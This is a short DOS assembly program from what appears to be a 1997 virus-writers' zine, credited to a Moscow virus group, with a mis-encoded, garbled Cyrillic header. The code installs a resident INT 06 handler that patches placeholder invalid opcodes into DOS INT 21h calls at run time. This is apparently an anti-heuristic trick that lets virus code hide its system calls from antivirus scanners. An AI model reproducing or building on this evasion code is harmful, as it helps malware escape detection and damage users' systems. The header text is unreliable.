;旼컴컴컴컴컴컴컴컫컴쩡컴컴컴컫컴컴컴컴컴컴컴컴컴컴컴컴컴컴컫컴컴컴컴컴컴컴컴커
;쿔NFECTED MOSCOW �#1� JAN'97 �(C)STEALTH Group MoscoW & Co � one@redline.ru~ �
;읕컴컴컴컴컴컴컴컨컴좔컴컴컴컨컴컴컴컴컴컴컴컴컴컴컴컴컴컴컨컴컴컴컴컴컴컴컴켸
;旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴쩡컴컴컴컴컴컴컴컴컴컴컴커
;� 렊�젩�洵Ø INT 06 ㄻ� �ⅷ㎙ηº�． �젵쳽        �(C) Stainless Steel Rat �
;읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴좔컴컴컴컴컴컴컴컴컴컴컴켸

		jumps
		.386p
cseg		segment para use16
		assume	cs:cseg,ds:cseg
		org	100h
start:
		mov ax,2506h
		mov dx,offset inter
		int 21h
		mov ax,3100h
		int 21h
inter:
		pop word ptr cs:[offset __ip]
		pop word ptr cs:[offset __cs]
		push word ptr cs:[offset __cs]
		push word ptr cs:[offset __ip]


		push es ax di bp
		mov ax,word ptr cs:[offset __cs]
		mov es,ax
		mov di,word ptr cs:[offset __ip]
		
		mov ax,word ptr es:[di+2]
		mov word ptr es:[di+1],ax
		mov byte ptr es:[di],0B8h
		mov word ptr es:[di+3],21CDh
		jmp exit

exit:
		pop bp di ax es
		iret

__ip		dw 0
__cs		dw 0



cseg		ends
                end  start